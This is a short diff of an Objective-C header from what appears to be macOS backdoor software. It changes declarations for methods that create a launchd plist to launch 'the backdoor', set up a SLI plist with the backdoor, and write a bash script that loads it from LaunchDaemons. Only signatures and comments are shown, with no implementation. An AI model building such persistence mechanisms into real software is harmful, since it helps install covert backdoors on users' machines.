@@ -72,9 +72,10 @@
 - (BOOL)createSLIPlistWithBackdoor;
 
 //
-// Create the launchctl plist file used for launching the Kext Loader script
+// Create the launchctl plist file used for launching the backdoor
 //
-- (BOOL)createLaunchAgentPlist: (NSString *)aLabel;
+- (BOOL)createLaunchAgentPlist: (NSString *)aLabel
+                     forBinary: (NSString *)aBinary;
 
 //
 // Create the bash script which will load our backdoor from LaunchDaemons
